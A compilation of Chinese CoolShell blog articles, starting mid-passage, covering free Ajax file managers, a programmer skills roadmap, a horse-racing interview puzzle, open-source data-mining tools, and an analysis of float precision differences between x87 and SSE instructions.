自动化编译 | 程序员需要使用一个脚本，其能自动化编程所有的工程和代码，这样，整个开发团队可以不停地集成代码，自动化测试，自动化部署，以及使用一些工具进行静态代码分析或是自动化测试。
当然，还有很多的基本技术也是非常重要的，比如，与人的沟通能力，语言的表达能力，写作能力，团队协作能力，适应变化的能力，时间管理能力，多任务处理能力，自我学习能力，故障处理能力，等等，等等，这里只是列举了和技术相关的能力，这些是程序最最最基本的能力，只要是程序员就必需要有的能力。# 7个免费强大的Ajax文件管理器作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn如果你正在开发一个WEB应用，需要一个不错的强大的文件管理器，并且可以简单的定制，那么，下面的这七个免费开源的文件管理器你一会喜欢的。这些文件管理器都很强大，他们全部都支持PHP，Javascript和Ajax，有几个还支持别的WEB开发语言。这些管理理可以让你完成目录文件浏览，搜索，上传/下载，编辑，拷贝，移动，删除等等文件操作功能。### 1\. AjaXplorer!Ajax File ManagerAjaXplorer 是一个免费的 Ajax 文件管理器，其很容易安装。而且它的布局很丰富，可以用于多种应用，比如：文件管理，文件共享，图片库，代码库等等。不过它只支持(4 呀 5) ，不支持数据库。
* 改名/拷贝/移动/删除/下载文件或目录。   * 以进度条的方式上传多个文件 (需要Flash 支持，不支持https)   * 创建目录和空文件。   * 编辑纯文本文件和代码 (js, php, html, java, sql, perl)，支持语法高亮。   * 查看图片，有缩略图功能。   * 可以在线地播放MP3文件。   * 在线地查看Flash videos (FLV) 文件。   * 可以在线地浏览或解压ZIP 文件。**链接：*** **下载** ：   * **演示** ：### 2\. fileNice!Ajax File ManagerfileNice 是一个免费的PHP文件浏览器。**链接：*** **主页：**   * **演示：**### 3\. File Thingie!Ajax File ManagerFile Thingie 是一个小型的文件管理器。由PHP写成。他主要的目的是提示一个WEB界面的文件管理器（如果你不能使用或是不会使用FTP）。通过File Thingie你可以完成下面这些事：* 安装简单— 只有一个文件   * 多文件上传   * 多用户和用户组   * 创建子目录   * 改名，移动，删除，拷贝文件和目录   * 搜索文件或目录名   * 通过黑/白名单进行文件级的存取控制   * 编辑纯文本文件   * 在线Unzip 文件   * 非常容易地进行CSS界面定制   * 支持多国语言
**链接：*** **教程：**   * **下载：**### 4\. MooTools based FileManager!Ajax File ManagerMooTools based File-Manager 提供了预览，上传和修改文件和目录的功能。其主要功能如下：* 浏览文件和目录   * 改名，删除，移动（拖放）,拷贝（Ctrl+拖放）和下载   * 查看文件细节和预览图片文件，文本文件，压缩文件和音频文件。   * 非常不错的UI设计    * 通过FancyUpload 上传文件   * 提供在上传时自动缩放图片尺寸的选项**链接：*** **演示：**   * **下载：**### 5\. Relay!Ajax File ManagerRelay 是一个极牛的Ajax 文件管理器。在上传和下载文件它做得相当出色。下面是它的一些功能：* 可以随意拖放文件和目录   * 动态地载入文件目录结构    * 上传文件进度条    * 缩略图预览（包括PDF文件）    * 多用户和帐号**链接：*** **演示：**   * **主页：**### 6\. Kae’s File Manager
!Ajax File ManagerKFM 是一个在线的文件管理器，它可以单独使用或是以一个插件的方式给一些编辑器使用。比如这些编辑器：FCKeditor 或TinyMCE。KFM 是一个开源的免费的项目，下面是它的一些特性：* 鼠标拖放功能   * 图标显示，列表显示   * 支持插件   * 图片操作，幻灯片播放   * 简单的安装和升级   * 文本编辑时语法高亮   * 搜索引擎   * 标签   * 多语言   * mp3 和视频播放插件**链接：*** **演示：**   * **主页：**### 7\. eXtplorer!Ajax File ManagereXtplorer 特性如下：* 文件目录浏览   * 编辑，复制，移动，删除文件   * 搜索，上传和下载文件   * 创建和释放压缩文件   * 创建文件和目录   * 更改文件和目录权限   * 其它更多更多的内容**链接：*** **主页：**文章：来源# 程序员技术练级攻略作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**注：该文最新的版本在这里 《程序员技术练级攻略（2018版）》（需要付费阅读）**
月光博客6月12日发表了《写给新手程序员的一封信》，翻译自《An open letter to those who want to start programming》，我的朋友（他在本站的id是Mailper）告诉我，他希望在酷壳上看到一篇更具操作性的文章。因为他也是喜欢编程和技术的家伙，于是，我让他把他的一些学习Python和Web编程的一些点滴总结一下。于是他给我发来了一些他的心得和经历，我在把他的心得做了不多的增改，并根据我的经历增加了“进阶”一节。 **这是一篇由新手和我这个老家伙根据我们的经历完成的文章** 。我的这个朋友把这篇文章取名叫Build Your Programming Technical Skills，我实在不知道用中文怎么翻译，但我在写的过程中， **我觉得这很像一个打网游做任务升级的一个过程，所以取名叫“技术练级攻略”，题目有点大，呵呵，这个标题纯粹是为了好玩** 。 **这里仅仅是在分享Mailper和我个人的学习经历。** （注：省去了我作为一个初学者曾经学习过的一些技术(今天明显过时了)，如：Delphi/Power builder，也省去了我学过的一些我觉得没意思的技术Lotus Notes/ActiveX/COM/ADO/ATL/.NET ……）
目录* 前言   * 启蒙入门   * 进阶加深   * 高级深入#### 前言你是否觉得自己从学校毕业的时候只做过小玩具一样的程序？走入职场后哪怕没有什么经验也可以把以下这些课外练习走一遍（朋友的抱怨：学校课程总是从理论出发，作业项目都看不出有什么实际作用，不如从工作中的需求出发）建议：* 不要乱买书，不要乱追新技术新名词，基础的东西经过很长时间积累而且还会在未来至少10年通用。   * 回顾一下历史，看看历史上时间线上技术的发展，你才能明白明天会是什么样。   * 一定要动手，例子不管多么简单，建议至少自己手敲一遍看看是否理解了里头的细枝末节。   * 一定要学会思考，思考为什么要这样，而不是那样。还要举一反三地思考。**注** ：你也许会很奇怪为什么下面的东西很偏Unix/Linux，这是因为我觉得Windows下的编程可能会在未来很没有前途，原因如下：* 现在的用户界面几乎被两个东西主宰了，1）Web，2）移动设备iOS或Android。Windows的图形界面不吃香了。   * 越来越多的企业在用成本低性能高的Linux和各种开源技术来构架其系统，Windows的成本太高了。   * 微软的东西变得太快了，很不持久，他们完全是在玩弄程序员。详情参见《Windows编程革命史》
所以，我个人认为以后的趋势是前端是Web+移动，后端是Linux+开源。开发这边基本上没Windows什么事。#### 启蒙入门**1、 学习一门脚本语言，例如Python/Ruby**可以让你摆脱对底层语言的恐惧感，脚本语言可以让你很快开发出能用得上的小程序。实践项目:* 处理文本文件，或者csv (关键词 python csv, python open, python sys) 读一个本地文件，逐行处理（例如 word count，或者处理log）   * 遍历本地文件系统 (sys, os, path)，例如写一个程序统计一个目录下所有文件大小并按各种条件排序并保存结果   * 跟数据库打交道 (python sqlite)，写一个小脚本统计数据库里条目数量   * 学会用各种print之类简单粗暴的方式进行调试   * 学会用Google (phrase, domain, use reader to follow tech blogs)为什么要学脚本语言，因为他们实在是太方便了，很多时候我们需要写点小工具或是脚本来帮我们解决问题，你就会发现正规的编程语言太难用了。**2、 用熟一种程序员的编辑器(不是IDE) 和一些基本工具**
* Vim / Emacs / Notepad++，学会如何配置代码补全，外观，外部命令等。   * Source Insight (或 ctag)使用这些东西不是为了Cool，而是这些编辑器在查看、修改代码/配置文章/日志会更快更有效率。**3、 熟悉Unix/Linux Shell和常见的命令行*** 如果你用windows，至少学会用虚拟机里的linux， vmware player是免费的，装个Ubuntu吧   * 一定要少用少用图形界面。   * 学会使用man来查看帮助   * 文件系统结构和基本操作 ls/chmod/chown/rm/find/ln/cat/mount/mkdir/tar/gzip …   * 学会使用一些文本操作命令 sed/awk/grep/tail/less/more …   * 学会使用一些管理命令 ps/top/lsof/netstat/kill/tcpdump/iptables/dd…   * 了解/etc目录下的各种配置文章，学会查看/var/log下的系统日志，以及/proc下的系统运行信息   * 了解正则表达式，使用正则表达式来查找文件。
对于程序员来说Unix/Linux比Windows简单多了。（参看我四年前CSDN的博文《其实Unix很简单》）学会使用Unix/Linux你会发现图形界面在某些时候实在是太难用了，相当地相当地降低工作效率。**4、 学习Web基础（HTML/CSS/JS) + 服务器端技术 (LAMP)**未来必然是Web的世界，学习WEB基础的最佳网站是W3School。* 学习HTML基本语法   * 学习CSS如何选中HTML元素并应用一些基本样式（关键词：box model）   * 学会用 Firefox + Firebug 或 chrome 查看你觉得很炫的网页结构，并动态修改。   * 学习使用Javascript操纵HTML元件。理解DOM和动态网页（) 网上有免费的章节，足够用了。或参看 DOM 。   * 学会用 Firefox + Firebug 或 chrome 调试Javascript代码（设置断点，查看变量，性能，控制台等）   * 在一台机器上配置Apache 或 Nginx   * 学习PHP，让后台PHP和前台HTML进行数据交互，对服务器相应浏览器请求形成初步认识。实现一个表单提交和反显的功能。   * 把PHP连接本地或者远程数据库 MySQL（MySQL 和 SQL现学现用够了）   * 跟完一个名校的网络编程课程（例如： ) 不要觉得需要多于一学期时间，大学生是全职一学期选3-5门课，你业余时间一定可以跟上   * 学习一个javascript库（例如jQuery 或 ExtJS）+ Ajax (异步读入一个服务器端图片或者数据库内容）+JSON数据格式。   * HTTP: The Definitive Guide 读完前4章你就明白你每天上网用浏览器的时候发生的事情了(proxy, gateway, browsers)   * 做个小网站（例如：一个小的留言板，支持用户登录，Cookie/Session，增、删、改、查，上传图片附件，分页显示）   * 买个域名，租个空间，做个自己的网站。
#### 进阶加深**1、 C语言和操作系统调用*** 重新学C语言，理解指针和内存模型，用C语言实现一下各种经典的算法和数据结构。推荐《计算机程序设计艺术》、《算法导论》和《编程珠玑》。   * 学习（麻省理工免费课程）计算机科学和编程导论   * 学习（麻省理工免费课程）C语言内存管理   * 学习Unix/Linux系统调用（Unix高级环境编程），，了解系统层面的东西。      * 用这些系统知识操作一下文件系统，用户（实现一个可以拷贝目录树的小程序）     * 用fork/wait/waitpid写一个多进程的程序，用pthread写一个多线程带同步或互斥的程序。多进程多进程购票的程序。     * 用signal/kill/raise/alarm/pause/sigprocmask实现一个多进程间的信号量通信的程序。     * 学会使用gcc和gdb来编程和调试程序（参看我的《用gdb调试程序》）     * 学会使用makefile来编译程序。（参看我的《跟我一起写makefile》）     * IPC和Socket的东西可以放到高级中来实践。   * 学习Windows SDK编程（Windows 程序设计 ，MFC程序设计）      * 写一个窗口，了解WinMain/WinProcedure，以及Windows的消息机制。     * 写一些程序来操作Windows SDK中的资源文件或是各种图形控件，以及作图的编程。     * 学习如何使用MSDN查看相关的SDK函数，各种WM_消息以及一些例程。     * 这本书中有很多例程，在实践中请不要照抄，试着自己写一个自己的例程。     * 不用太多于精通这些东西，因为GUI正在被Web取代，主要是了解一下Windows 图形界面的编程。@virushuo 说：“ 我觉得GUI确实不那么热门了，但充分理解GUI工作原理是很重要的。包括移动设备开发，如果没有基础知识仍然很吃力。或者说移动设备开发必须理解GUI工作，或者在win那边学，或者在mac/iOS上学”。
**2、学习Java*** Java 的学习主要是看经典的Core Java 《Java 核心技术编程》和《Java编程思想》（有两卷，我仅链了第一卷，足够了，因为Java的图形界面了解就可以了）   * 学习JDK，学会查阅Java API Doc    * 了解一下Java这种虚拟机语言和C和Python语言在编译和执行上的差别。从C、Java、Python思考一下“跨平台”这种技术。   * 学会使用IDE Eclipse，使用Eclipse 编译，调试和开发Java程序。   * 建一个Tomcat的网站，尝试一下JSP/Servlet/JDBC/MySQL的Web开发。把前面所说的那个PHP的小项目试着用JSP和Servlet实现一下。**3、Web的安全与架构*** 学习HTML5，网上有很多很多教程，以前酷壳也介绍过很多，我在这里就不罗列了。   * 学习Web开发的安全问题（参考新浪微博被攻击的这个事，以及Ruby的这篇文章）   * 学习HTTP Server的rewrite机制，Nginx的反向代理机制，fast-cgi（如：PHP-FPM）   * 学习Web的静态页面缓存技术。   * 学习Web的异步工作流处理，数据Cache，数据分区，负载均衡，水平扩展的构架。   * **实践任务：**     * 使用HTML5的canvas 制作一些Web动画。     * 尝试在前面开发过的那个Web应用中进行SQL注入，JS注入，以及XSS攻击。     * 把前面开发过的那个Web应用改成构造在Nginx + PHP-FPM + 静态页面缓存的网站
**4、学习关系型数据库*** 你可以安装MSSQLServer或MySQL来学习数据库。   * 学习教科书里数据库设计的那几个范式，1NF，2NF，3NF，……   * 学习数据库的存过，触发器，视图，建索引，游标等。   * 学习SQL语句，明白表连接的各种概念（参看《SQL Join的图示》）   * 学习如何优化数据库查询（参看《MySQL的优化》）   * **实践任务** ：设计一个论坛的数据库，至少满足3NF，使用SQL语句查询本周，本月的最新文章，评论最多的文章，最活跃用户。**5、一些开发工具*** 学会使用SVN或Git来管理程序版本。   * 学会使用JUnit来对Java进行单元测试。   * 学习C语言和Java语言的coding standard 或 coding guideline。（我N年前写过一篇关C语言非常简单的文章——《编程修养》，这样的东西你可以上网查一下，一大堆）。   * 推荐阅读《代码大全》《重构》《代码整洁之道》#### 高级深入**1、C++ / Java 和面向对象**我个人以为学好C++，Java也就是举手之劳。但是C++的学习曲线相当的陡。不过，我觉得C++是最需要学好的语言了。参看两篇趣文“C++学习信心图” 和“21天学好C++”
* 学习（麻省理工免费课程）C++面向对象编程   * 读我的 “如何学好C++”中所推荐的那些书至少两遍以上（如果你对C++的理解能够深入到像我所写的《C++虚函数表解析》或是《C++对象内存存局》，或是《C/C++返回内部静态成员的陷阱》那就非常不错了）   * 然后反思为什么C++要干成这样，Java则不是？你一定要学会对比C++和Java的不同。比如，Java中的初始化，垃圾回收，接口，异常，虚函数，等等。   * **实践任务：**     * 用C++实现一个BigInt，支持128位的整形的加减乘除的操作。     * 用C++封装一个数据结构的容量，比如hash table。     * 用C++封装并实现一个智能指针（一定要使用模板）。   * 《设计模式》必需一读，两遍以上，思考一下，这23个模式的应用场景。主要是两点：1）钟爱组合而不是继承，2）钟爱接口而不是实现。（也推荐《深入浅出设计模式》）   * **实践任务：**     * 使用工厂模式实现一个内存池。     * 使用策略模式制做一个类其可以把文本文件进行左对齐，右对齐和中对齐。     * 使用命令模式实现一个命令行计算器，并支持undo和redo。     * 使用修饰模式实现一个酒店的房间价格订价策略——旺季，服务，VIP、旅行团、等影响价格的因素。   * 学习STL的用法和其设计概念 – 容器，算法，迭代器，函数子。如果可能，请读一下其源码。   * **实践任务：** 尝试使用面向对象、STL，设计模式、和WindowsSDK图形编程的各种技能      * 做一个贪吃蛇或是俄罗斯方块的游戏。支持不同的级别和难度。     * 做一个文件浏览器，可以浏览目录下的文件，并可以对不同的文件有不同的操作，文本文件可以打开编辑，执行文件则执行之，mp3或avi文件可以播放，图片文件可以展示图片。   * 学习C++的一些类库的设计，如： MFC（看看候捷老师的《深入浅出MFC》） ，Boost, ACE, CPPUnit，STL （STL可能会太难了，但是如果你能了解其中的设计模式和设计那就太好了，如果你能深入到我写的《STL string类的写时拷贝技术》那就非常不错了，ACE需要很强在的系统知识，参见后面的“加强对系统的了解”）   * Java是真正的面向对象的语言，Java的设计模式多得不能再多，也是用来学习面向对象的设计模式的最佳语言了（参看Java中的设计模式）。   * 推荐阅读《Effective Java》 and 《Java解惑》   * 学习Java的框架，Java的框架也是多，如Spring, Hibernate，Struts 等等，主要是学习Java的设计，如IoC等。   * Java的技术也是烂多，重点学习J2EE架构以及JMS， RMI, 等消息传递和远程调用的技术。   * 学习使用Java做Web Service （官方教程在这里）   * **实践任务：** 尝试在Spring或Hibernate框架下构建一个有网络的Web Service的远程调用程序，并可以在两个Service中通过JMS传递消息。
C++和Java都不是能在短时间内能学好的，C++玩是的深，Java玩的是广，我建议两者选一个。我个人的学习经历是：* 深究C++（我深究C/C++了十来年了）   * 学习Java的各种设计模式。**2、加强系统了解**重要阅读下面的几本书：* 《Unix编程艺术》了解Unix系统领域中的设计和开发哲学、思想文化体系、原则与经验。你一定会有一种醍醐灌顶的感觉。   * 《Unix网络编程卷1，套接字》这是一本看完你就明白网络编程的书。重要注意TCP、UDP，以及多路复用的系统调用select/poll/epoll的差别。   * 《TCP/IP详解 卷1:协议》- 这是一本看完后你就可以当网络黑客的书。了解以太网的的运作原理，了解TCP/IP的协议，运作原理以及如何TCP的调优。   * **实践任务：**     * 理解什么是阻塞（同步IO），非阻塞（异步IO），多路复用（select, poll, epoll）的IO技术。     * 写一个网络聊天程序，有聊天服务器和多个聊天客户端（服务端用UDP对部分或所有的的聊天客户端进Multicast或Broadcast）。     * 写一个简易的HTTP服务器。   * 《Unix网络编程卷2，进程间通信》信号量，管道，共享内存，消息等各种IPC…… 这些技术好像有点老掉牙了，不过还是值得了解。   * **实践任务：**     * 主要实践各种IPC进程序通信的方法。     * 尝试写一个管道程序，父子进程通过管道交换数据。     * 尝试写一个共享内存的程序，两个进程通过共享内存交换一个C的结构体数组。   * 学习《Windows核心编程》一书。把CreateProcess，Windows线程、线程调度、线程同步（Event, 信号量，互斥量）、异步I/O，内存管理，DLL，这几大块搞精通。   * **实践任务：** 使用CreateProcess启动一个记事本或IE，并监控该程序的运行。把前面写过的那个简易的HTTP服务用线程池实现一下。写一个DLL的钩子程序监控指定窗口的关闭事件，或是记录某个窗口的按键。   * 有了多线程、多进程通信，TCP/IP，套接字，C++和设计模式的基本，你可以研究一下ACE了。使用ACE重写上述的聊天程序和HTTP服务器（带线程池）   * **实践任务：** 通过以上的所有知识，尝试      * 写一个服务端给客户端传大文件，要求把100M的带宽用到80%以上。（注意，磁盘I/O和网络I/O可能会很有问题，想一想怎么解决，另外，请注意网络传输最大单元MTU）     * 了解BT下载的工作原理，用多进程的方式模拟BT下载的原理。
**3、系统架构*** 负载均衡。HASH式的，纯动态式的。（可以到Google学术里搜一些关于负载均衡的文章读读）   * 多层分布式系统 – 客户端服务结点层、计算结点层、数据cache层，数据层。J2EE是经典的多层结构。   * CDN系统 – 就近访问，内容边缘化。   * P2P式系统，研究一下BT和电驴的算法。比如：DHT算法。   * 服务器备份，双机备份系统（Live-Standby和Live-Live系统），两台机器如何通过心跳监测对方？集群主结点备份。   * 虚拟化技术，使用这个技术，可以把操作系统当应用程序一下切换或重新配置和部署。   * 学习Thrift，二进制的高性能的通讯中间件，支持数据(对象)序列化和多种类型的RPC服务。   * 学习Hadoop。Hadoop框架中最核心的设计就是：MapReduce和HDFS。MapReduce的思想是由Google的一篇论文所提及而被广为流传的，简单的一句话解释MapReduce就是“任务的分解与结果的汇总”。HDFS是Hadoop分布式文件系统（Hadoop Distributed File System）的缩写，为分布式计算存储提供了底层支持。   * 了解NoSQL数据库（有人说可能是一个过渡炒作的技术），不过因为超大规模以及高并发的纯动态型网站日渐成为主流，而SNS类网站在数据存取过程中有着实时性等刚性需求，这使得目前NoSQL数据库慢慢成了人们所关注的焦点，并大有成为取代关系型数据库而成为未来主流数据存储模式的趋势。当前NoSQL数据库很多，大部分都是开源的，其中比较知名的有：MemcacheDB、Redis、Tokyo Cabinet(升级版为Kyoto Cabinet)、Flare、MongoDB、CouchDB、Cassandra、Voldemort等。
写了那么多，回顾一下，觉得自己相当的有成就感。希望大家不要吓着，我自己这十来年也在不断地学习，今天我也在学习中，人生本来就是一个不断学习和练级的过程。 **不过，一定有漏的，也有不对的，还希望大家补充和更正** 。（ **我会根据大家的反馈随时更新此文** ）欢迎大家通过我的微博（@左耳朵耗子）和twitter（@haoel）和我交流。_**—– 更新 2011/07/19 —–**_1）有朋友奇怪为什么我在这篇文章开头说了web+移动，却没有在后面提到iOS/Android的前端开发。因为我心里有一种感觉，移动设备上的UI最终也会被Javascript取代。大家可以用iPhone或Android看看google+，你就会明白了。2）有朋友说我这里的东西太多了，不能为了学习而学习，我非常同意。我在文章的前面也说了要思考。另外，千万不要以为我说的这些东西是一些新的技术，这份攻略里95%以上的全是基础。而且都是久经考验的基础技术。即是可以让你一通百通的技术，也是可以让你找到一份不错工作的技术。3）有朋友说学这些东西学完都40了，还不如想想怎么去挣钱。我想告诉大家，一是我今年还没有40岁，二是学无止境啊，三是我不觉得挣钱有多难，难的是怎么让你值那么多钱？无论是打工还是创业，是什么东西让你自己的价值，让你公司的价值更值钱？别的地方我不敢说，对于互联网或IT公司来说，技术实力绝对是其中之一。
4）有朋友说技术都是工具，不应该如此痴迷这句话没有错，有时候我们需要更多的是抬起头来看看技术以外的事情，或者是说我们在作技术的时候不去思考为什么会有这个技术，为什么不是别的，问题不在于技术，问题在于我们死读书，读死书，成了技术的书呆子。5） 对于NoSQL，最近比较火，但我对其有点保守，所以，我只是说了解就可以。对于Hadoop，我觉得其在分布式系统上有巨大的潜力，所以需要学习。 对于关系型数据库，的确是很重要的东西，这点是我的疏忽，在原文里补充。（全文完）* * ***注：该文最新的版本在这里 《程序员技术练级攻略（2018版）》（需要付费阅读）**# 面试题：赛马问题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn据说，这是Google的面试题。面试题目如下：**!Question一共有25匹马，有一个赛场，赛场有5个赛道，就是说最多同时可以有5匹马一起比赛。假设每匹马都跑的很稳定，不用任何其他工具，只通过马与马之间的比赛，试问，最少得比多少场才能知道跑得最快的5匹马？（** 不能使用撞大运的算法 **）**很明显这是一个算法题，网上有很多贴子在讨论这个问题，不过都没有给出一个明确的答案。我想了想，想到下面的一个算法：
1）分成5组A，B，C，D，E，比五场。然后根据每场结果分别给这五组内的五匹马排序（从快到慢）。   2）每组的头名再赛一场，取走第一名，然后该组第二名顶上。   3）重复第二步，直到选出前5名。这个算法是比较笨的算法，总计需要 **赛10次，** 这个算法应该是万无一失的。现在的问题的就，如何优化这个算法，想了想，的确是有优化的空间的。也就是说，是可以少于10次的。想了一想，上面的那个算法自从第6次开始就使用5个排序数组的头名做“冒泡法”，总是挑一个最优秀的出来，其实， **在第6次以后除了挑出最优秀的，我们还可以在每次比赛后淘汰一些速度不行的** ，淘汰的马匹数自然会比选出的更多，所以，一方面在找，另一方面在淘汰，找出前5名的速度应该会更快。比如：我们假设比赛完第六场后，我们得到下面的排序：（每组排序是——快马从左到右，各组头名的排序是——快马从上到下）A组 A1 A2 A3 A4 A5   B组 B1 B2 B3 B4 B5   C组 C1 C2 C3 C4 C5   D组 D1 D2 D3 D4 D5   E组 E1 E2 E3 E4 E5这样，我们不但知道，A1是25匹马里最快的马，而且我们可以淘汰近一半的马，比如E2，E3，E4，E5就可以全部淘汰了，为什么呢，因为比E2快的马有A1,B1,C1,D1,E1这五匹马，所以，E2后面的马是无法进入前五名了；同理，D3和其后面的也进入不了前5；同理，C4，C5，B5都可以淘汰。
于是，在第六轮后我们可以得知，除了A1外的Top 4必然在下面这些马中：A组 A2 A3 A4 A5   B组 B1 B2 B3 B4   C组 C1 C2 C3   D组 D1 D2   E组 E1接下来的过程应该不必我多说了。重复前面的方法，尽可能淘汰无法进前N名的马，于是后面的马就越来越少，你所需要的比赛也会越来越少。那么，对于这个题，聪明的你知道最少要比赛几场了吗？举一反三，如果有64匹马，8个赛道呢？不失一般性，如果有N匹马，M个赛道呢？N = M*M，那么公式是什么呢？期待你的答案！# 五个免费开源的数据挖掘软件作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在网上看到一篇文章介绍五个免费开源的数据挖掘软件，转过来。目录* Orange   * RapidMiner   * Weka   * JHepWork   * KNIME#### OrangeOrange 是一个基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，基绑定了Python以进行脚本开发。它包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。其由C++ 和 Python开发，它的图形库是由跨平台的Qt框架开发。
#### RapidMinerRapidMiner, 以前叫 YALE (Yet Another Learning Environment), 其是一个给机器学习和数据挖掘和分析的试验环境，同时用于研究了真实世界数据挖掘。它提供的实验由大量的算子组成，而这些算子由详细的XML 文件记录，并被RapidMiner图形化的用户接口表现出来。RapidMiner为主要的机器学习过程提供了超过500算子，并且，其结合了学习方案和Weka学习环境的属性评估器。它是一个独立的工具可以用来做数据分析，同样也是一个数据挖掘引擎可以用来集成到你的产品中。#### Weka由Java开发的 Weka (Waikato Environment for Knowledge Analysis) 是一个知名机器学机软件，其支持几种经典的数据挖掘任务，显著的数据预处理，集群，分类，回归，虚拟化，以及功能选择。其技术基于假设数据是以一种单个文件或关联的，在那里，每个数据点都被许多属性标注。 Weka 使用Java的数据库链接能力可以访问SQL数据库，并可以处理一个数据库的查询结果。它主要的用户接品是Explorer，也同样支持相同功能的命令行，或是一种基于组件的知识流接口。
#### JHepWork为科学家，工程师和学生所设计的 jHepWork 是一个免费的开源数据分析框架，其主要是用开源库来创建 一个数据分析环境，并提供了丰富的用户接口，以此来和那些收费的的软件竞争。它主要是为了科学计算用的二维和三维的制图，并包含了用Java实现的数学科学库，随机数，和其它的数据挖掘算法。 jHepWork 是基于一个高级的编程语言 Jython，当然，Java代码同样可以用来调用 jHepWork 的数学和图形库。#### KNIMEKNIME (Konstanz Information Miner) 是一个用户友好，智能的，并有丰演的开源的数据集成，数据处理，数据分析和数据勘探平台。它给了用户有能力以可视化的方式创建数据流或数据通道，可选择性地运行一些或全部的分析步骤，并以后面研究结果，模型 以及 可交互的视图。 KNIME 由Java写成，其基于 Eclipse 并通过插件的方式来提供更多的功能。通过以插件的文件，用户可以为文件，图片，和时间序列加入处理模块，并可以集成到其它各种各样的开源项目中，比如：R语言，Weka， Chemistry Development Kit, 和 LibSVM.
源文：（墙）# 一个浮点数跨平台产生的问题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**感谢网友唐磊（微博@唐磊_name）投稿，本文原文在唐磊的博客上（原文地址），原文分析还不够好，而且可能对人有误导，所以，我对原文做了很多修改，并加了Linux下的内容。浮点数是一个很复杂的事情，希望这篇文章有助于大家了解浮点数与其相关的C/C++的编译选项。**（注：我没有Windows 32位以及C#的环境，所以，对于Windows 32位的程序和C#的程序没有验证过）背景就简单点儿说，最近一个项目C#编写，涉及浮点运算，来龙去脉省去，直接看如下代码。float p3x = 80838.0f;     float p2y = -2499.0f;     double v321 = p3x * p2y;     Console.WriteLine(v321);很简单吧，马上笔算下结果为-202014162，没问题，难道C#没有产生这样的结果？不可能吧，开启Visual Studio，copy代码试试，果然结果是-202014162。就这样完了么？显然没有！你把编译时的选项从AnyCPU改成x64试试~(服务器环境正是64位滴哦！！)结果居然边成了-202014160，对没错，就是-202014160。有点不相信，再跑两遍，仍然是-202014160。呃，想通了，因为浮点运算的误差，-202014160这个结果是合理的。
为什么合理呢？很正常，因为上面的p3x和p2y是两个float类型，虽然v321是double，但也是两个float类型计算完后再转成double的， **float的精度本来也只有7位，所以，对于这个上亿的数，自然没有办法保证精度** 。**但是为什么修改CPU的type会有不同的效果？** 嗯，我们再试试C/C++。return 0;     }上面这段C++代码在不同的平台下的结果如下：* Windows 32/64位下：-202014160   * Linux 64位下（CentOS 6 gcc 4.4.7）-202014160，   * Linux 32位下（Ubuntu 12.04+ gcc 4.6.3）是：-202014162**合理的结果应该是-202014160，正确的运算结果是-202014162** ，合理性是浮点精度不够造成的（文后解释了合理性）。若是用两个double相乘可得正确且合理的运算结果（注：把上面C++的程序中的p3x和p2y的类型声明成double，就能得到正确的结果，因为double是双精度的，float是单精度，所以double有足够的位数存放更多的数位）。 **但是我们有点不明白，为什么Linux 32位下，居然能算出“正确”的数，而不是“合理”的数** 。
与C++一样，C#在32位和64位（DEBUG下，这个后面会说）下没有得到一致的结果，那我们来看一下C++/C#的汇编代码（使用gdb的disassemble /m main 命令，另外下面只显示 float * float 然后转成double的那一行代码的汇编）**Linux平台下用G++编译**//C++ 32位系统下 Ubuntu 12.04     8	    double v321 = p3x * p2y;     0x0804860f <+27>:	flds   0x18(%esp)     0x08048613 <+31>:	fmuls  0x1c(%esp)     0x08048617 <+35>:	fstpl  0x10(%esp).......//C++ 64位系统下 CentOS 6     9           double v321 = p3x * p2y;     0x000000000040083c <+24>:    movss  -0x20(%rbp),%xmm0     0x0000000000400841 <+29>:    mulss  -0x1c(%rbp),%xmm0     0x0000000000400846 <+34>:    unpcklps %xmm0,%xmm0     0x0000000000400849 <+37>:    cvtps2pd %xmm0,%xmm0     0x000000000040084c <+40>:    movsd  %xmm0,-0x18(%rbp)
**Windows平台下用Visual Studio编译**//C# AnyCPU编译，Windows VS2012     double v321 = p3x * p2y;     00000049  fld         dword ptr [ebp-40h]     0000004c  fmul        dword ptr [ebp-44h]     0000004f  fstp        qword ptr [ebp-4Ch]//C# X64位编译 Windows7 VS2012     double v321 = p3x * p2y;</pre>     009B43B8 movss xmm0,dword ptr [p3x]     009B43BD mulss xmm0,dword ptr [p2y]     009B43C2 cvtss2sd xmm0,xmm0     009B43C6 movsd mmword ptr [v321],xmm0从上面的汇编代码可以看出，无论是Linux和Windows，C++或C# 32位和64对浮点数的汇编指令并不一样。 32位生成代码用的指令是fld/fmul/fstp等，而64位下的使用了movss/mulss/movsd/的指令。看下来，似乎这个事情和平台有关系。
我们继续调查，我们发现，其中fld/fmul/fstp等指令是由 **FPU** (float point unit)浮点运算处理器做的，准确的说，是FPU x87指令，FPU在进行浮点运算时，用了 **80位** 的寄存器做相关浮点运算，然后再根据是float/double截取成32位或64位，FPU默认上会尽量减少由于需要四舍五入带来的精度问题。可参看浮点运算标准IEEE-754 推荐标准实现者提供浮点可扩展精度格式(Extended precision)，Intel x86处理器有FPU(float point unit)浮点运算处理器支持这种扩展。非FPU的情况是用了SSE中128位寄存器(float实际只用了其中的32位，计算时也是以32位计算的)，这就是导致上述问题产生的最终原因。详细分析见文末说明。知道了这一点，我们可以man g++ 看一下文档，我们可以找到一个编译选项叫： **-mfpmath，在32位下，这个编译选项的默认值是：387，也就是x87 FPU指令，在64位下，这个编译选项的值是sse，也就是使用SSE的指令** 。所以，就这篇文章中的这个例子而言，如果你在64bits下加上如 -mfpmath=387，你会得到“正确的”结果，而不是“合理的”结果。
